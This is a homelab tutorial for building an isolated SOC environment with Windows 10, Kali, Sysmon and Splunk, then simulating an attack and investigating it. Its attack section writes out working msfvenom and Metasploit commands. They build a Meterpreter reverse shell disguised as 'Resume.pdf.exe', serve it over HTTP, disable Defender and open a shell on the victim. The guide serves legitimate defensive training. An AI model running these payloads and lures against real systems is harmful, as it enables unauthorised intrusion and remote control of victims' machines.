# Building a SOC Homelab: Attack and defense Simulation
A SOC homelab simulating real attacker-defender scenarios using Kali, Windows, sysmon and splunk

1. Project Overview
This guide walks you through setting up a fully functional Security Operations Center (SOC) home lab, compatible with VirtualBox and VMware Workstation.
You'll build a safe, isolated environment using Windows 10, Kali Linux, Sysmon, and Splunk to simulate real-world attacker–defender scenarios. Designed for both beginners and intermediate learners, the guide provides in-depth, hands-on instruction covering everything from virtual machine setup and secure networking to malware generation, event telemetry, and log analysis using enterprise-grade tools.

2. Install VirtualBox

Visit https://www.virtualbox.org.
   - Download the latest version of VirtualBox for your OS.
   - Run the installer and complete the installation.
   - If you encounter errors related to missing dependencies (especially on Linux), follow the prompts or install the required packages manually.
💡 Tip: If your C: drive has low storage, you can save VMs to another drive like D:/ or E:/.

3. Plan Your Lab Setup

We’ll create a simulated environment using virtual machines:
   - Windows 10 — main machine (target/victim), will run Sysmon and Splunk.
   - Kali Linux — attacker machine for simulating threats.
Feel free to customize with more machines (like Ubuntu for ELK stack, Security Onion, etc.) as your system allows.\


4. Get a Windows 10 ISO Image

🔗 Link: https://www.microsoft.com/en-ca/softwaredownload/windows10
📥 Steps:
  - Click Download tool now.
  - Run the downloaded MediaCreationTool.
  - Accept the license terms.
  - Select:
    ✅ Create installation media (USB flash drive, DVD, or ISO file) for another PC
        Click Next
  - Choose language, edition, and architecture, or leave "Use the recommended options" checked.
  - Select ISO file as the output format.
  - Save the ISO file to your preferred location.

5. Set Up the Windows 10 Virtual Machine

  - Open VirtualBox, click New.
  - Enter name: Windows 10.
  - Select the ISO image you just created.
  - Skip unattended installation to install the OS manually (optional).
  - Assign resources:
      RAM: at least 2–4 GB (more if you can)
      CPU: Minimum 1 core, 2 cores recommended for smoother performance
  - Keep virtual hard disk settings as default (dynamically allocated is fine).
  - Review settings and click Finish.
  - Power on the VM.

  6. Install Windows 10

   - Choose language, region, and keyboard layout.
   - When asked for a product key, click “I don’t have a product key”.
   - Select the edition to install (e.g., Windows 10 Pro).
   - Accept the license agreement.
   - Choose “Custom: Install Windows only (advanced)”.
   - Select the virtual disk and click Next.
  Windows will now begin installation.

7. Install Kali Linux

Download the official Kali Linux virtual machine image for easy import into VirtualBox.
🔗 Link: https://www.kali.org/get-kali/#kali-virtual-machines
You have two options:
  ✅ Pre-built VM (quickest, recommended)
  🔧 Manual install via ISO (similar to Windows install)

Once downloaded:
   - Extract the .ova file if needed.
   - Open VirtualBox → File → Import Appliance.
   - Import the Kali Linux VM and power it on.

8. Installing Sysmon and Splunk Before Isolation

Once you've set up the internal network and isolated the virtual machines, they will no longer have internet access. Therefore, make sure you complete the installations of Sysmon and Splunk while the network is still in NAT mode (the default setting). 

🔧 Tool Installation (Windows VM)

Install Splunk Enterprise
  - Go to: https://www.splunk.com
  - Download and install Splunk Enterprise on your Windows VM.

Install Sysmon
  - Download from Microsoft: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
  - Download Olaf Hartong’s configuration  file: [sysmonconfig.xml](https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml)
  - Right-click the config link → Save As → sysmonconfig.xml

Set Up Sysmon
  - Extract the downloaded Sysmon zip.
  - Open PowerShell as Administrator.
  - cd to the directory containing both sysmon64.exe and sysmonconfig.xml.
  - Run:
     .\Sysmon64.exe -i .\sysmonconfig.xml
      Accept license terms when prompted.
  - Verify Sysmon Installation
     Open Services, search for Sysmon.
     Alternatively, use Event Viewer → Applications and Services Logs → Microsoft → Windows → check for Sysmon.

9. Configuring Virtual Machine Networking Securely
Step-by-Step Configuration in VirtualBox

Configure both Windows and Kali Linux VMs to be on the same isolated internal network:

    Windows 10:

        Go to Settings → Network

        Set Attached to: Internal Network

        Name: test

        Click OK

    Kali Linux:

        Go to Settings → Network

        Set Attached to: Internal Network

        Name: test

        Click OK

    ✅ Reminder: Ensure both VMs use the exact same network name (test) so they can communicate.

Step 2: Assign Static IP Addresses

Since the Internal Network has no DHCP server, you need to assign static IPs manually.
🪟 On Windows 10:

    Boot the VM

    Right-click the globe icon in the system tray → Open Network & Internet Settings

    Click Change adapter options

    Right-click the Ethernet adapter → Properties

    Select Internet Protocol Version 4 (TCP/IPv4) → Properties

    Select Use the following IP address

    IP Address: 192.168.20.10

    Click OK

✅ Now open CMD and type ipconfig to verify the assigned IP.
🐱‍💻 On Kali Linux:

    Boot the VM

    Click the Ethernet icon (top right corner)

    Select Edit Connections → Choose the wired connection

    Click the ⚙️ (gear) icon → Go to IPv4 Settings

    Set Method to Manual

    Click Add under Addresses:

        IP Address: 192.168.20.11

        Netmask: 24

    Click Save

✅ Open a terminal and run ifconfig to confirm the IP.
Step 3: Test Connectivity

To test communication between the two VMs:

    From Kali: Run ping 192.168.20.10
        This might fail initially because Windows blocks inbound ICMP traffic by default.

    From Windows CMD: Run ping 192.168.20.11
        This should work, confirming successful connectivity.

📸 Final Step: Take Snapshots

Once everything is configured and working:

    Take a snapshot of both Windows and Kali VMs

    This allows you to revert to a clean state if anything goes wrong

10. Equivalent Setup in VMware Workstation

If you're using VMware Workstation, the concept is similar but the naming is different.
Step-by-Step:
 -  In VMware, go to the top menu → VM → Settings (or press Ctrl + D)
 -   Navigate to Network Adapter
 -   Instead of "Internal Network" (used in VirtualBox), VMware uses LAN Segment for isolated networking
 -   Click the LAN Segments button → Add → Name it: test → Click OK
 -   Now set LAN Segment as the network type and select the test segment from the dropdown
 -   Click OK

Just like in VirtualBox, you’ll need to assign static IPs manually in each VM to ensure they’re on the same subnet.
Now you're ready to safely analyze malware in an isolated environment using either VirtualBox or VMware.

11. Configure inputs.conf to Ingest Sysmon Logs
Head back to your Windows VM and navigate to the following path:

C:\Program Files\Splunk\etc\system\local

If inputs.conf does not exist:

Go to:

C:\Program Files\Splunk\etc\system\default

Copy the file inputs.conf

Paste it into the local folder:

C:\Program Files\Splunk\etc\system\local

📝 Replace the Contents of inputs.conf

    🚨 Important: Don’t edit the file manually. Instead, replace everything in inputs.conf with the preconfigured version provided in the GitHub repo.

    Go to the lab's GitHub repository.

    Locate the file:

    inputs.conf

    Copy everything in that file.

    Open the local inputs.conf file in a text editor (like Notepad).

    Delete all existing content in the file.

    Paste the copied contents from the GitHub version.

    Save and close the file.

This configuration ensures that Splunk is correctly set up to collect all relevant Sysmon logs using the lab's custom settings.

12. Malware Generation and Handler Setup Using Metasploit
📌 Step 1: Get the IP Address of Your Kali Machine

We need the IP address of our Kali (attacker) machine to configure the malware:

ifconfig     # or use: ip a

👉 Take note of your IP address – we’ll use this as the LHOST value while generating the malware and setting up the listener.
🔍 Step 2: Optional Nmap Reference

Familiarize yourself with nmap options:

nmap -h

Example usage:

nmap -A 192.168.20.10 -Pn

💣 Step 3: Generate Malware with msfvenom

Explore available payloads:

msfvenom -l payloads

We'll use:

windows/x64/meterpreter_reverse_tcp

Malware Generation Command:

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali IP> LPORT=4444 -f exe -o Resume.pdf.exe

Example:

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe

    This creates a reverse shell payload.

    The output file Resume.pdf.exe will attempt to connect back to the attacker machine on port 4444 (default for Meterpreter).

Verify the file exists:

ls
file Resume.pdf.exe

🧲 Step 4: Setup a Listener with Metasploit

Launch Metasploit:

msfconsole

Select the multi/handler module:

use exploit/multi/handler

Show current options:

options

Note: The default payload is usually generic/shell_reverse_tcp. We’ll change it to match our malware:

set payload windows/x64/meterpreter/reverse_tcp

Press Tab if unsure—it helps autocomplete!

Now re-check options:

options

Set the correct LHOST:

set LHOST <Kali IP>
set LHOST 192.168.20.11

Start the listener:

exploit

🎯 You are now listening for connections on port 4444.
🌐 Step 5: Share Malware via HTTP Server

In a new terminal tab, make sure you're in the same directory as Resume.pdf.exe, then start a Python HTTP server:

python3 -m http.server 9999

✅ Use any available port (e.g., 9999).

Your Kali machine is now hosting the malware at:

http://192.168.20.11:9999

🪟 Step 6: On the Windows Test Machine

Disable Windows Defender:

    Go to:
    Windows Security > Virus & threat protection > Manage Settings

    Turn off Real-time Protection

Open browser and visit:

http://192.168.20.11:9999

    Download Resume.pdf.exe.
    If you see a warning about the file not being commonly downloaded — ignore it only for this lab.

    Run the file.
    If Windows shows a warning, choose Run anyway.

🧪 Step 7: Confirm the Connection

Open Command Prompt as Administrator and run:

netstat -anob

🔍 Look for:

    An established connection to Kali’s IP:4444

    Check the Process ID (e.g., 10208)

    Open Task Manager > Details tab, find that PID → it should be Resume.pdf.exe

✅ If yes — your malware has executed successfully.
💻 Step 8: Back on Kali – You Have a Shell!

In the Metasploit handler, you should now see a session opened.

Type:

help

Try:

shell        # Spawn a shell on victim machine

Test with some useful commands:

net user
net localgroup
ipconfig

You're in! 🔓

13. Investigating Attack Activity in Splunk

Once you've successfully ingested Sysmon logs into Splunk and executed the simulated attack (e.g., Nmap scan and Resume.pdf.exe malware), here’s how to investigate these activities:
🔍 Step 1: Check Nmap Scan Activity

Run the following search in Splunk’s Search & Reporting app:

index=endpoint 192.168.20.11

This query filters logs where your Kali machine’s IP appears (as attacker).

    Under Fields, look for:

        dest_port: If you see only one port (e.g., dest_port=3389), ask:

            “Should this machine be connecting to our RDP port? Who owns this machine?”

🧠 While this log shows an incoming connection attempt, Sysmon alone doesn't show full Nmap scan behavior (like sequential port scanning). That’s why:

    🛡️ It's highly recommended to have a network sensor (e.g., Zeek or Suricata) deployed between your machines. These can detect:

        TCP flags

        Scanning patterns

        Protocol signatures

Without it, the telemetry is limited to what the endpoint sees—making it harder to distinguish between legitimate access and reconnaissance attempts.
🦠 Step 2: Investigate Malware Execution (Resume.pdf.exe)

To check for events related to the malware file, run:

index=endpoint Resume.pdf.exe

This searches for all logs where the filename Resume.pdf.exe appears.

    Under Fields, you’ll typically see multiple EventCodes, such as:

        EventCode 1: Process creation

        EventCode 3: Network connection

        EventCode 7: Image loaded

        EventCode 11: File created

        (There may be more depending on your Sysmon config)

These events give you visibility into what the malware did, such as:

    Which process launched it

    What files it accessed

    If it initiated a network connection (like reverse TCP)

    Which DLLs or system files it loaded

This is crucial for understanding malware behavior post-execution.
